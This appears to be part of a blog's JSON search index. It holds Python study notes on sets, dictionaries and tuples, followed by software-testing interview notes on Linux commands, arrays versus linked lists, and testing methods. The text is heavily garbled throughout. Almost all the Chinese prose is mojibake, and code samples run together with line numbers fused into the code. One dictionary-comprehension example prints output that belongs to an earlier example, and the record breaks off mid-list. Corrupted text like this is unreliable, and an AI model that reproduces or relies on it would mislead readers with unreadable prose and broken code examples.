pop(): ä¸€æ¬¡éšæœºåˆ é™¤ä¸€ä¸ªä»»æ„å…ƒç´  clear(): æ¸…ç©º 123456789101112131415161718192021s={1,3,5,6,4} print(1 in s) #Trueprint(1 not in s) #Falses.add(80)print(s) #{80, 1, 3, 4, 5, 6}s.update({100,200,300})print(s) #{1, 3, 4, 5, 6, 100, 200, 300, 80}s.update([100,98,89])print(s) #{1, 98, 3, 4, 5, 6, 100, 200, 300, 80, 89}s.update([78,64,56])print(s) #{64, 1, 98, 3, 4, 5, 6, 100, 200, 300, 78, 80, 56, 89} s.remove(100)print(s) #{64, 1, 98, 3, 4, 5, 6, 200, 300, 78, 80, 56, 89}s.discard(500)print(s) #{64, 1, 98, 3, 4, 5, 6, 200, 300, 78, 80, 56, 89}s.discard(300)print(s) #{64, 1, 98, 3, 4, 5, 6, 200, 78, 80, 56, 89}s.pop()print(s) #{1, 98, 3, 4, 5, 6, 200, 78, 80, 56, 89}s.clear()print(s) #set() é›†åˆé—´çš„å…³ç³» æ˜¯å¦ç›¸ç­‰ï¼š == æˆ– != ä¸€ä¸ªé›†åˆæ˜¯å¦ä¸ºå¦ä¸€é›†åˆçš„å­é›†ï¼š issubset bæ˜¯açš„å­é›† ä¸€ä¸ªé›†åˆæ˜¯å¦ä¸ºå¦ä¸€é›†åˆçš„è¶…é›†ï¼š issuperset aæ˜¯bçš„è¶…é›† ä¸¤é›†åˆæ˜¯å¦æ— äº¤é›†ï¼š isdisjoint 1234s={10,20,30,40}s2={30,40,20,10}print(s==s2) #Trueprint(s!=s2) #False eg: 12345678910111213141516s1={10,20,30,40,50,60}s2={10,20,30,40}s3={10,20,90}print(s2.issubset(s1))print(s3.issubset(s2))print(s1.issuperset(s2))print(s1.issuperset(s3))print(s2.isdisjoint(s3))s4={100,200,300}print(s2.isdisjoint(s4)) #True #False #True #False #False #True é›†åˆçš„æ•°å­¦æ“ä½œ12345678910s1={10,20,30,40}s2={20,30,40,50,60}print(s1.intersection(s2))print(s1 &amp; s2) #{40, 20, 30}print(s1.union(s2))print(s1 | s2) #{40, 10, 50, 20, 60, 30}print(s1.difference(s2))print(s1-s2) #{10}print(s1.symmetric_difference(s2))print(s1^s2) #{50, 10, 60} é›†åˆç”Ÿæˆå¼1234lst=[i*i for i in range(6)]print(lst) #[0, 1, 4, 9, 16, 25]s={i*i for i in range(6)}print(s) #{0, 1, 4, 9, 16, 25}","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Pythonå­¦ä¹ 4","slug":"pythonå­¦ä¹ 4","date":"2022-09-05T09:05:23.791Z","updated":"2022-09-05T11:20:04.588Z","comments":true,"path":"2022/09/05/pythonå­¦ä¹ 4/","link":"","permalink":"https://sinky.top/2022/09/05/python%E5%AD%A6%E4%B9%A04/","excerpt":"","text":"(å•Šï¼Œæœ€è¿‘æ‰¾å·¥ä½œæ‰¾çš„å¿ƒçƒ¦æ„ä¹±ï¼Œå¿ƒæµ®æ°”èºï¼Œéƒ½æ²¡åŠæ³•é™ä¸‹å¿ƒå­¦ä¹ äº†ï¼Œæ‘†çƒ‚äº†å¥½å‡ å¤©ä¹‹åæ·±è§‰ä¸åº”è¯¥å¦‚æ­¤ï¼Œæ— è®ºæ‰¾å·¥ä½œæ€ä¹ˆæ ·å­ï¼Œæ¯å¤©çš„å­¦ä¹ ä¹Ÿä¸åº”è¯¥ä¸­æ–­) å­—å…¸åˆ—è¡¨ï¼š [] å­—å…¸ï¼š {} å¯å˜åºåˆ—ï¼Œä»¥é”®å€¼å¯¹æ–¹å¼å­˜å‚¨æ•°æ® æ ¹æ®keyæŸ¥æ‰¾valueæ‰€åœ¨ä½ç½®ã€‚ åˆ›å»ºscore={'å¼ ä¸‰':100,'æå››':98,'ç‹äº”':45} å†…ç½®å‡½æ•°dict(name='jack',age=20) eg: 1234567score={'å¼ ä¸‰':100,'æå››':98,'ç‹äº”':45}print(score) #{'å¼ ä¸‰': 100, 'æå››': 98, 'ç‹äº”': 45}print(type(score)) #&lt;class 'dict'&gt;s=dict(name='jack',age=20)print(s) #{'name': 'jack', 'age': 20}d={}print(d) #{} å…ƒç´ è·å– []: score[â€˜å¼ ä¸‰â€™] è‹¥å­—å…¸ä¸­ä¸å­˜åœ¨æŒ‡å®škey,åˆ™æŠ›å‡ºkeyerror get(): score.get(â€˜å¼ ä¸‰â€™) è‹¥ä¸å­˜åœ¨keyï¼Œåˆ™è¿”å›None 12345score={'å¼ ä¸‰':100,'æå››':98,'ç‹äº”':45}print(score['å¼ ä¸‰']) #100print(score.get('å¼ ä¸‰')) #100print(score.get('é™ˆå…­')) #Noneprint(score.get('å˜›ä¸ƒ',99)) #99 #99æ˜¯å˜›ä¸ƒæ‰€å¯¹valueä¸å­˜åœ¨æ—¶æä¾›çš„é»˜è®¤å€¼ å¸¸ç”¨æ“ä½œkeyçš„åˆ¤æ–­ in : keyåœ¨å­—å…¸ä¸­è¿”å›True not in : keyä¸åœ¨å­—å…¸ä¸­è¿”å›True 123score={'å¼ ä¸‰':100,'æå››':98,'ç‹äº”':45}print('å¼ ä¸‰' in score) #Trueprint('å¼ ä¸‰' not in score) #False å…ƒç´ åˆ é™¤del score['å¼ ä¸‰'] print(score) #{'æå››': 98, 'ç‹äº”': 45} score.clear() #æ¸…ç©ºå­—å…¸ print(score) #{} å…ƒç´ æ–°å¢score['é™ˆå…­']=98 print(score) #{'æå››': 98, 'ç‹äº”': 45, 'é™ˆå…­': 98} å…ƒç´ ä¿®æ”¹score['é™ˆå…­']=1001 print(score) #{'æå››': 98, 'ç‹äº”': 45, 'é™ˆå…­': 1001} è·å–å­—å…¸è§†å›¾çš„ä¸‰ä¸ªæ–¹æ³• keys() è·å–å­—å…¸ä¸­æ‰€æœ‰key value() è·å–å­—å…¸ä¸­æ‰€æœ‰value items() è·å–å­—å…¸ä¸­æ‰€æœ‰key,valueå¯¹ 12345678910111213score={'å¼ ä¸‰':100,'æå››':98,'ç‹äº”':45} #è·å–æ‰€æœ‰keykeys=score.keys()print(keys) #dict_keys(['å¼ ä¸‰', 'æå››', 'ç‹äº”'])print(list(keys)) #['å¼ ä¸‰', 'æå››', 'ç‹äº”'] å°†æ‰€æœ‰keyç»„æˆçš„è§†å›¾è½¬æˆåˆ—è¡¨ #è·å–æ‰€æœ‰valuevalues=score.values()print(values) #dict_values([100, 98, 45])print(list(values)) #[100, 98, 45] #è·å–æ‰€æœ‰é”®å€¼å¯¹items=score.items()print(items) #dict_items([('å¼ ä¸‰', 100), ('æå››', 98), ('ç‹äº”', 45)])print(list(items)) #[('å¼ ä¸‰', 100), ('æå››', 98), ('ç‹äº”', 45)] å…ƒç´ éå†12345678score={'å¼ ä¸‰':100,'æå››':98,'ç‹äº”':45}for item in score: print(item)for item in score: print(item,score[item],score.get(item)) #å¼ ä¸‰ 100 100 #æå›› 98 98 #ç‹äº” 45 45 ç‰¹ç‚¹ æ‰€æœ‰å…ƒç´ éƒ½æ˜¯key-valueé”®å€¼å¯¹ï¼Œkeyä¸å¯é‡å¤ï¼Œvalueå¯é‡å¤ æ— åº keyä¸å¯å˜ å­—å…¸å¯åŠ¨æ€ä¼¸ç¼© å­—å…¸è¾ƒå¤§æµªè´¹å†…å­˜ï¼Œæ˜¯ä¸€ç§ä½¿ç”¨ç©ºé—´æ¢æ—¶é—´çš„æ•°æ®ç»“æ„ 1234567d={'name':'å¼ ä¸‰','name':'æå››'}print(d) #{'name': 'æå››'}d={'name':'å¼ ä¸‰','nikename':'æå››'}print(d) #{'name': 'å¼ ä¸‰', 'nikename': 'æå››'}lst=[10,20,30]lst.insert(1,100)print(lst) #[10,100,20,30] å­—å…¸ç”Ÿæˆå¼å†…ç½®å‡½æ•°zip() ç”¨äºå°†å¯è¿­ä»£å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå°†å¯¹è±¡ä¸­å¯¹åº”çš„å…ƒç´ æ‰“åŒ…æˆä¸€ä¸ªå…ƒç»„ï¼Œç„¶åè¿”å›ç”±è¿™äº›å…ƒç»„ç»„æˆçš„åˆ—è¡¨ã€‚ {item.upper() ï¼ˆ#è¿™æ˜¯keyï¼‰:price(#è¿™æ˜¯value) for item,price(#è‡ªå®šä¹‰å˜é‡key,value) in zip(items,prices(#å¯è¿­ä»£å¯¹è±¡))} eg: 1234items=['Fruits','Books','Others']prices=[96,78,85]{ item.upper():price for item,price in zip(items,prices)}print(d) #{'name': 'å¼ ä¸‰', 'nikename': 'æå››'} å…ƒç»„pythonå†…ç½®æ•°æ®ç»“æ„ä¹‹ä»¥ï¼Œä¸å¯å˜åºåˆ— åˆ›å»º t=('Python','hello',90) å†…ç½®å‡½æ•°tuple() t=tuple(('Python','hello',90)) t=(10,) å•å…ƒç´ è¦åŠ é€—å·ç”¨ä»¥åŒºåˆ† 123456789t=tuple(('Python','world',90))print(t) #('Python', 'world', 90)print(type(t)) #&lt;class 'tuple'&gt;t2='Python','world',90print(type(t2)) #&lt;class 'tuple'&gt;t3=('Python',)print(type(t3)) #&lt;class 'tuple'&gt;t1=tuple(('Python','world',90))print(t1) #('Python', 'world', 90) ç©ºåˆ—è¡¨ã€å­—å…¸ã€å…ƒç»„ 123456lst=[]list1=list()d={}d1=dict()t=()t1=tuple() ä¸ºä½•å…ƒç»„ä¸å¯å˜ï¼ˆ1ï¼‰å¤šä»»åŠ¡ç¯å¢ƒä¸‹ï¼ŒåŒæ—¶æ“ä½œå¯¹è±¡æ—¶ä¸éœ€è¦åŠ é” ï¼ˆ2ï¼‰å…ƒç»„ä¸­å­˜å‚¨çš„æ˜¯å¯¹è±¡çš„å¼•ç”¨ï¼š * è‹¥å¯¹è±¡æœ¬èº«ä¸å¯å˜ï¼Œåˆ™ä¸èƒ½å†å¼•ç”¨å…¶ä»–å¯¹è±¡ * è‹¥å¯¹è±¡æ˜¯å¯å˜çš„ï¼Œåˆ™å¯å˜å¯¹è±¡çš„å¼•ç”¨ä¸å…è®¸æ”¹å˜ï¼Œä½†æ•°æ®å¯ä»¥å˜ã€‚ 12345678910t=[10,[20,30],90]print(t) #[10, [20, 30], 90]print(type(t)) #&lt;class 'list'&gt;print(t[0],type(t[0]),id(t[0])) #10 &lt;class 'int'&gt; 2150843443792print(t[1],type(t[1]),id(t[1])) #[20, 30] &lt;class 'list'&gt; 2150955913664print(t[2],type(t[2]),id(t[2])) #90 &lt;class 'int'&gt; 2150843634832print(id(100)) #2150843635152 #ç”±äº[20,30]åˆ—è¡¨ï¼Œè€Œåˆ—è¡¨æ˜¯å¯å˜åºåˆ—ï¼Œæ‰€ä»¥å¯ä»¥å‘åˆ—ä¸­æ·»åŠ å…ƒç´ ï¼Œè€Œåˆ—è¡¨çš„å†…å­˜åœ°å€ä¸å˜t[1].append(100)print(t,id(t[1])) #[10, [20, 30, 100], 90] 2150952344704 ï¼ˆ3ï¼‰å…ƒç»„éå† å…ƒç»„å¯è¿­ä»£ï¼Œç”¨forâ€¦inâ€¦éå† 123456t=tuple(('Python','hello',90))for item in t: print(item) #Python #hello #90","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"è½¯æµ‹é¢è¯•å‡†å¤‡","slug":"è½¯æµ‹é¢è¯•å‡†å¤‡","date":"2022-09-02T01:34:40.342Z","updated":"2022-09-02T14:44:04.935Z","comments":true,"path":"2022/09/02/è½¯æµ‹é¢è¯•å‡†å¤‡/","link":"","permalink":"https://sinky.top/2022/09/02/%E8%BD%AF%E6%B5%8B%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/","excerpt":"","text":"åŸºæœ¬linuxå‘½ä»¤ file: é€šè¿‡æ¢æµ‹æ–‡ä»¶å†…å®¹åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œä½¿ç”¨æƒé™æ˜¯æ‰€æœ‰ç”¨æˆ·ã€‚ -v åœ¨æ ‡å‡†è¾“å‡ºåæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡º -z æ¢æµ‹å‹ç¼©è¿‡çš„æ–‡ä»¶ç±»å‹ -L å…è®¸ç¬¦åˆè¿æ¥ mkdir: å»ºç«‹æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨æƒé™æ˜¯æ‰€æœ‰ç”¨æˆ· -m è®¾å®šæƒé™ -p åˆ›å»ºä¸Šå±‚ç›®å½• -v åˆ›å»ºæ–°ç›®å½•æ—¶æ˜¾ç¤ºä¿¡æ¯ï¼Œç‰ˆæœ¬ä¿¡æ¯ grep: æŒ‡å®šæ–‡ä»¶ä¸­æœç´¢ç‰¹å®šçš„å†…å®¹ï¼Œå¹¶å°†å«æœ‰è¿™äº›å†…å®¹çš„è¡Œæ ‡å‡†è¾“å‡ºã€‚æ ¼å¼ï¼šgrep å‚æ•° -c åªè¾“å‡ºåŒ¹é…è¡Œçš„è®¡æ•° -i ä¸åŒºåˆ†å¤§å°å†™ï¼ˆåªé€‚ç”¨å•å­—ç¬¦ï¼‰ -h æŸ¥è¯¢å¤šæ–‡ä»¶æ—¶ä¸æ˜¾ç¤ºæ–‡ä»¶å -l æŸ¥è¯¢å¤šæ–‡ä»¶æ—¶åªè¾“å‡ºåŒ…å«åŒ¹é…å­—ç¬¦çš„æ–‡ä»¶å -n æ˜¾ç¤ºåŒ¹é…åŠè¡Œå· -s ä¸æ˜¾ç¤ºä¸å­˜åœ¨æˆ–æ— åŒ¹é…æ–‡æœ¬çš„é”™è¯¯ä¿¡æ¯ -v æ˜¾ç¤ºä¸åŒ…å«åŒ¹é…æ–‡æœ¬çš„æ‰€æœ‰è¡Œ find: åœ¨ç›®å½•ç§æœç´¢æ–‡ä»¶ï¼Œæƒé™ä¸ºæ‰€æœ‰ç”¨æˆ·ï¼Œæ ¼å¼ï¼šfind [path] pathæŒ‡å®šç›®å½•è·¯å¾„ï¼Œè·¯å¾„åˆ—è¡¨ï¼Œäº’ç›¸ç”¨ç©ºæ ¼åˆ†ç¦»ã€‚ depth: ä½¿ç”¨æ·±åº¦çº§åˆ«çš„æŸ¥æ‰¾è¿‡ç¨‹æ–¹å¼ï¼Œåœ¨æŸå±‚æŒ‡å®šç›®å½•ç§ä¼˜å…ˆæŸ¥æ‰¾æ–‡ä»¶å†…å®¹ æ•°ç»„å’Œé“¾è¡¨çš„åŒºåˆ«åŠä¼˜ç¼ºç‚¹ï¼Œå¦‚ä½•ç»“åˆä¸¤è€…ä¼˜ç‚¹1ã€æ•°ç»„ æ•°ç»„æ˜¯å°†å…ƒç´ åœ¨å†…å­˜ä¸­è¿ç»­å­˜æ”¾ï¼Œç”±äºæ¯ä¸ªå…ƒç´ å ç”¨å†…å­˜ç›¸åŒï¼Œå¯ä»¥é€šè¿‡ä¸‹æ ‡è¿…é€Ÿè®¿é—®æ•°ç»„ä¸­ä»»ä½•å…ƒç´ ï¼Œä½†è‹¥åœ¨æ•°ç»„ä¸­å¢åŠ ä¸€ä¸ªå…ƒç´ ï¼Œéœ€è¦ç§»åŠ¨å¤§é‡å…ƒç´ ï¼Œåœ¨å†…å­˜ä¸­ç©ºå‡ºä¸€ä¸ªå…ƒç´ çš„ç©ºé—´ï¼Œç„¶åå°†è¦å°†è¦å¢åŠ çš„å…ƒç´ æ”¾å…¥ 2ã€é“¾è¡¨ é“¾è¡¨ä¸­çš„å…ƒç´ åœ¨å†…å­˜ä¸­ä¸æ˜¯é¡ºåºå­˜å‚¨ï¼Œè€Œæ˜¯é€šè¿‡å­˜åœ¨å…ƒç´ ä¸­çš„æŒ‡é’ˆè”ç³»åˆ°ä¸€èµ·ï¼Œæ¯ä¸ªç»“ç‚¹åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå­˜å‚¨æ•°æ®å…ƒç´ çš„æ•°æ®åŸŸï¼Œå’Œå­˜å‚¨ä¸‹ä¸€ä¸ªç»“ç‚¹åœ°å€çš„æŒ‡é’ˆã€‚ è‹¥è¦è®¿é—®é“¾è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œéœ€è¦ä»ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ï¼Œä¸€ç›´æ‰¾åˆ°éœ€è¦çš„å…ƒç´ ä½ç½®ï¼Œä½†å¢åˆ å…ƒç´ ï¼Œåªéœ€ä¿®æ”¹å…ƒç´ ä¸­çš„æŒ‡é’ˆå³å¯ã€‚ 3ã€åŒºåˆ« å­˜å‚¨ä½ç½®ï¼šæ•°ç»„é€»è¾‘ä¸Šç›¸é‚»çš„å…ƒç´ åœ¨ç‰©ç†å­˜å‚¨ä½ç½®ä¸Šä¹Ÿç›¸é‚»ï¼Œä½†é“¾è¡¨ä¸ä¸€å®š å­˜å‚¨ç©ºé—´ï¼šé“¾è¡¨å­˜æ”¾çš„å†…å­˜ç©ºé—´å¯ä»¥è¿ç»­ä¹Ÿå¯ä»¥ä¸è¿ç»­ï¼Œä½†æ•°ç»„æ˜¯è¿ç»­çš„ä¸€æ®µå†…å­˜ç©ºé—´ã€‚æ•°ç»„å­˜æ”¾ç›¸åŒå¤šçš„æ•°æ®æ•°ç»„å ç”¨å†…å­˜è¾ƒå°ï¼Œä½†é“¾è¡¨è¿˜éœ€å­˜æ”¾å‰é©±å’Œåç»§çš„ç©ºé—´ã€‚ é•¿åº¦å¯å˜æ€§ï¼šé“¾è¡¨é•¿åº¦æŒ‰å®é™…å¯ä¼¸ç¼©ï¼Œæ•°ç»„é•¿åº¦æ˜¯å®šä¹‰å›ºå®šçš„ã€‚ æŒ‰åºå·æŸ¥æ‰¾ï¼šæ•°ç»„å¯éšæœºè®¿é—®ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(1)ï¼Œé“¾è¡¨ä¸æ”¯æŒéšæœºè®¿é—®ï¼Œå¹³å‡éœ€è¦O(n) 4ã€å“ˆå¸Œè¡¨å¯ä»¥ç»“åˆæ•°ç»„å’Œé“¾è¡¨çš„ä¼˜ç‚¹ æµ‹è¯•çš„ç›¸å…³æµç¨‹éœ€æ±‚æµ‹è¯•-æ¦‚è¦è®¾è®¡æµ‹è¯•-è¯¦ç»†æ¶‰åŠæµ‹è¯•-å•å…ƒæµ‹è¯•-é›†æˆæµ‹è¯•-ç³»ç»Ÿæµ‹è¯•-éªŒæ”¶æµ‹è¯• å¦‚ä½•å†™æµ‹è¯•ç”¨ä¾‹1ã€æµ‹è¯•å‘˜å°½æ—©ä»‹å…¥ï¼Œå½»åº•ç†è§£æ¸…æ¥šéœ€æ±‚ä½œä¸ºå†™æµ‹è¯•ç”¨ä¾‹çš„åŸºç¡€ 2ã€è‹¥ä»¥å‰æœ‰ç±»ä¼¼çš„éœ€æ±‚ï¼Œå¯ä»¥å‚è€ƒç±»ä¼¼éœ€æ±‚çš„æµ‹è¯•ç”¨ä¾‹ï¼Œè¿˜éœ€è¦çœ‹ç±»ä¼¼éœ€æ±‚çš„bugæƒ…å†µ 3ã€æ¸…æ¥šè¾“å…¥ã€è¾“å‡ºçš„å„ç§å¯èƒ½æ€§ï¼Œä»¥åŠå„ç§è¾“å…¥çš„ä¹‹é—´çš„å…³è”å…³ç³»ï¼Œç†è§£æ¸…æ¥šéœ€æ±‚çš„æ‰§è¡Œé€»è¾‘ï¼Œé€šè¿‡ç­‰ä»·ç±»ã€è¾¹ç•Œå€¼ã€åˆ¤å®šè¡¨ç­‰æ–¹æ³•æ‰¾å‡ºå¤§éƒ¨åˆ†ç”¨ä¾‹ã€‚ 4ã€æ‰¾åˆ°éœ€æ±‚ç›¸å…³çš„ä¸€äº›ç‰¹æ€§ï¼Œè¡¥å……æµ‹è¯•ç”¨ä¾‹ 5ã€æ ¹æ®è‡ªå·±çš„ç»éªŒåˆ†æé—æ¼çš„æµ‹è¯•åœºæ™¯ 6ã€å¤šæ€»ç»“ç±»ä¼¼åŠŸèƒ½ç‚¹çš„æµ‹è¯•ç‚¹ 7ã€ä¹¦å†™æ ¼å¼æ¸…æ™° éœ€æ±‚åˆ†æ-éœ€æ±‚è¯„å®¡-æµ‹è¯•è®¡åˆ’ä¸è¯„å®¡-ç¼–å†™æµ‹è¯•ç”¨ä¾‹ æµ‹è¯•çš„å¸¸ç”¨æ–¹æ³•(1) é»‘ç›’æµ‹è¯•æ–¹æ³•ï¼š é»‘ç›’æµ‹è¯•ä¹Ÿç§°åŠŸèƒ½æµ‹è¯•æˆ–æ•°æ®é©±åŠ¨æµ‹è¯•ï¼Œå®ƒæ˜¯åœ¨å·²çŸ¥äº§å“æ‰€åº”å…·æœ‰çš„åŠŸèƒ½ï¼Œé€šè¿‡æµ‹è¯•æ¥æ£€æµ‹æ¯ä¸ªåŠŸèƒ½æ˜¯å¦éƒ½èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œåœ¨æµ‹è¯•æ—¶ï¼ŒæŠŠç¨‹åºçœ‹ä½œä¸€ä¸ªä¸èƒ½æ‰“å¼€çš„é»‘ç›†å­ï¼Œåœ¨å®Œå…¨ä¸è€ƒè™‘ç¨‹åºå†…éƒ¨ç»“æ„å’Œå†…éƒ¨ç‰¹æ€§çš„æƒ…å†µä¸‹ï¼Œæµ‹è¯•è€…åœ¨ç¨‹åºæ¥å£è¿›è¡Œæµ‹è¯•ï¼Œå®ƒåªæ£€æŸ¥ç¨‹åºåŠŸèƒ½æ˜¯å¦æŒ‰ç…§éœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦çš„è§„å®šæ­£å¸¸ä½¿ç”¨ï¼Œç¨‹åºæ˜¯å¦èƒ½é€‚å½“åœ°æ¥æ”¶è¾“å…¥æ•°é”¯è€Œäº§ç”Ÿæ­£ç¡®çš„è¾“å‡ºä¿¡æ¯ï¼Œå¹¶ä¸”ä¿æŒå¤–éƒ¨ä¿¡æ¯ï¼ˆå¦‚æ•°æ®åº“æˆ–æ–‡ä»¶ï¼‰çš„å®Œæ•´æ€§ã€‚ â€œé»‘ç›’â€æ³•ç€çœ¼äºç¨‹åºå¤–éƒ¨ç»“æ„ã€ä¸è€ƒè™‘å†…éƒ¨é€»è¾‘ç»“æ„ã€é’ˆå¯¹è½¯ä»¶ç•Œé¢å’Œè½¯ä»¶åŠŸèƒ½è¿›è¡Œæµ‹è¯•ã€‚â€œé»‘ç›’â€æ³•æ˜¯ç©·ä¸¾è¾“å…¥æµ‹è¯•ï¼Œåªæœ‰æŠŠæ‰€æœ‰å¯èƒ½çš„è¾“å…¥éƒ½ä½œä¸ºæµ‹è¯•æƒ…å†µä½¿ç”¨ï¼Œæ‰èƒ½ä»¥è¿™ç§æ–¹æ³•æŸ¥å‡ºç¨‹åºä¸­æ‰€æœ‰çš„é”™è¯¯ã€‚å®é™…ä¸Šæµ‹è¯•æƒ…å†µæœ‰æ— ç©·å¤šä¸ªï¼Œå› æ­¤ä¸ä»…è¦æµ‹è¯•æ‰€æœ‰åˆæ³•çš„è¾“å…¥ï¼Œè€Œä¸”è¿˜è¦å¯¹é‚£äº›ä¸åˆæ³•ä½†æ˜¯å¯èƒ½çš„è¾“å…¥è¿›è¡Œæµ‹è¯• a) ç­‰ä»·ç±»åˆ’åˆ†æ³•ï¼šå°†ç¨‹åºä¸­æ‰€æœ‰å¯èƒ½çš„è¾“å…¥æ•°æ®åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªç­‰ä»·ç±»ï¼Œç„¶åä»æ¯ä¸ªéƒ¨åˆ†ä¸­é€‰å–å…·æœ‰ä»£è¡¨æ€§çš„æ•°æ®å½“ä½œæµ‹è¯•ç”¨ä¾‹ã€‚æµ‹è¯•ç”¨ä¾‹ç”±æœ‰æ•ˆç­‰ä»·ç±»å’Œæ— æ•ˆç­‰ä»·ç±»çš„ä»£è¡¨æ•°æ®ç»„æˆï¼Œä»è€Œä¿è¯æµ‹è¯•ç”¨ä¾‹å…·æœ‰å®Œæ•´æ€§å’Œä»£è¡¨æ€§ã€‚ b) è¾¹ç•Œå€¼åˆ†ææ³•ï¼šå¯¹ç¨‹åºè¾“å…¥æˆ–è¾“å‡ºçš„è¾¹ç•Œå€¼è¿›è¡Œæµ‹è¯•ï¼ˆæ°å¥½å¤„äºè¾¹ç•Œã€æˆ–è¶…è¿‡è¾¹ç•Œã€æˆ–åœ¨è¾¹ç•Œä»¥ä¸‹çš„çŠ¶æ€ï¼‰ c) å› æœå›¾æ³•ï¼šä¸€ç§ç®€åŒ–é€»è¾‘å›¾ï¼Œèƒ½å¤Ÿç›´è§‚è¡¨æ˜è¾“å…¥æ¡ä»¶å’Œè¾“å‡ºåŠ¨ä½œä¹‹é—´çš„å› æœå…³ç³»ï¼Œé€‚åˆäºæè¿°å¯¹äºå¤šç§è¾“å…¥æ¡ä»¶ç»„åˆçš„æµ‹è¯•æ–¹æ³•ï¼Œæ ¹æ®è¾“å…¥æ¡ä»¶çš„ç»„ã€çº¦æŸå…³ç³»å’Œè¾“å‡ºæ¡ä»¶çš„å› æœå…³ç³»ï¼Œåˆ†æè¾“å…¥æ¡ä»¶çš„å„ç§ç»„åˆæƒ…å†µï¼Œä»è€Œè®¾è®¡æµ‹è¯•ç”¨ä¾‹çš„æ–¹æ³•ï¼Œé€‚åˆäºæ£€æŸ¥ç¨‹åºè¾“å…¥æ¡ä»¶çš„å„ç§ç»„åˆæƒ…å†µ d) é”™è¯¯æ¨æµ‹æ³•ï¼šåŸºäºä»¥å¾€çš„ç»éªŒå’Œç›´è§‰ï¼Œå‚ç…§ä»¥å¾€çš„è½¯ä»¶ç³»ç»Ÿå‡ºç°çš„é”™è¯¯ï¼Œæ¨æµ‹å½“å‰è¢«æµ‹ç¨‹åºä¸­å¯èƒ½å­˜åœ¨çš„ç¼ºé™·å’Œé”™è¯¯ï¼Œæœ‰é’ˆå¯¹æ€§åœ°è®¾è®¡æµ‹è¯•ç”¨ä¾‹ï¼Œåˆ—ä¸¾å‡ºç¨‹åºä¸­å¯èƒ½çŠ¯çš„é”™è¯¯æˆ–å®¹æ˜“å‘ç”Ÿé”™è¯¯çš„ç‰¹æ®Šæƒ…å†µçš„æ¸…å•ï¼Œæ ¹æ®æ¸…å•å’Œå·²ç»è®¾è®¡å¥½çš„æµ‹è¯•ç”¨ä¾‹æ¥ç¼–å†™ç‰¹å®šçš„æµ‹è¯•ç”¨ä¾‹ï¼Œç«™åœ¨ç”¨æˆ·çš„è§’åº¦æ¥è€ƒè™‘è¾“å…¥ä¿¡æ¯ï¼Œè€Œä¸å¿…å»ç®¡è¿™äº›ä¿¡æ¯å¯¹äºè¢«æµ‹ç¨‹åºæ˜¯å¦æ˜¯åˆç†çš„è¾“å…¥ã€‚ (2) ç™½ç›’æµ‹è¯•æ–¹æ³•ï¼š ç™½ç›’æµ‹è¯•ä¹Ÿç§°ä¸ºç»“æ„æµ‹è¯•æˆ–é€»è¾‘é©±åŠ¨æµ‹è¯•ï¼Œæ˜¯é’ˆå¯¹è¢«æµ‹å•å…ƒå†…éƒ¨æ˜¯å¦‚ä½•è¿›è¡Œå·¥ä½œçš„æµ‹è¯•ã€‚å®ƒæ ¹æ®ç¨‹åºçš„æ§åˆ¶ç»“æ„è®¾è®¡æµ‹è¯•ç”¨ä¾‹ï¼Œä¸»è¦ç”¨äºè½¯ä»¶æˆ–ç¨‹åºéªŒè¯ã€‚ç™½ç›’æµ‹è¯•æ³•æ£€æŸ¥ç¨‹åºå†…éƒ¨é€»è¾‘ç»“æ„ï¼Œå¯¹æ‰€æœ‰çš„é€»è¾‘è·¯å¾„è¿›è¡Œæµ‹è¯•ï¼Œæ˜¯ä¸€ç§ç©·ä¸¾è·¯å¾„çš„æµ‹è¯•æ–¹æ³•ï¼Œä½†å³ä½¿æ¯æ¡è·¯å¾„éƒ½æµ‹è¯•è¿‡äº†ï¼Œä½†ä»ç„¶æœ‰å¯èƒ½å­˜åœ¨é”™è¯¯ã€‚å› ä¸ºï¼šç©·ä¸¾è·¯å¾„æµ‹è¯•æ— æ³•æ£€æŸ¥å‡ºç¨‹åºæœ¬èº«æ˜¯å¦è¿åäº†è®¾è®¡è§„èŒƒï¼Œå³ç¨‹åºæ˜¯å¦æ˜¯ä¸€ä¸ªé”™è¯¯çš„ç¨‹åºï¼›ç©·ä¸¾è·¯å¾„æµ‹è¯•ä¸å¯èƒ½æ£€æŸ¥å‡ºç¨‹åºå› ä¸ºé—æ¼è·¯å¾„è€Œå‡ºé”™ï¼›ç©·ä¸¾è·¯å¾„æµ‹è¯•å‘ç°ä¸äº†ä¸€äº›ä¸æ•°æ®ç›¸å…³çš„é”™è¯¯ã€‚ ç™½ç›’æµ‹è¯•éœ€è¦éµå¾ªçš„åŸåˆ™æœ‰ï¼š1. ä¿è¯ä¸€ä¸ªæ¨¡å—ä¸­çš„æ‰€æœ‰ç‹¬ç«‹è·¯å¾„è‡³å°‘è¢«æµ‹è¯•ä¸€æ¬¡ï¼›2. æ‰€æœ‰é€»è¾‘å€¼å‡éœ€è¦æµ‹è¯•çœŸï¼ˆtrueï¼‰å’Œå‡ï¼ˆfalseï¼‰ï¼›ä¸¤ç§æƒ…å†µï¼›3. æ£€æŸ¥ç¨‹åºçš„å†…éƒ¨æ•°æ®ç»“æ„ï¼Œä¿è¯å…¶ç»“æ„çš„æœ‰æ•ˆæ€§ï¼›4. åœ¨ä¸Šä¸‹è¾¹ç•ŒåŠå¯æ“ä½œèŒƒå›´å†…è¿è¡Œæ‰€æœ‰å¾ªç¯ã€‚ a) 